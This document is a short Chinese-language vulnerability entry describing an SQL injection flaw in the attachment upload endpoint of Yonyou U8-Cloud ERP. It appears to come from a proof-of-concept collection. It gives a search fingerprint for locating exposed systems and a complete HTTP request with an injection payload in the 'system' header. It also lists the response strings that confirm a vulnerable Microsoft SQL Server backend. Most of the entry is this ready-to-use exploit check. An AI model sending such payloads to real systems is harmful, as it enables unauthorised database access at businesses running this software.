﻿# 用友U8-Cloud attachment_upload接口 SQL注入漏洞

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。用友U8-Cloud api/hr接口存在SQL注入漏洞。

> 漏洞特征：app="用友-U8-Cloud"

> 验证脚本：HTTP

```
GET /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
system: -1' or 1=@@version--+
```

> 响应代码特征：200

> 响应内容特征：Microsoft SQL Server

> 上传文件定位：

> 验证文件来源：用友U8-Cloud attachment_upload接口 SQL注入漏洞.poc

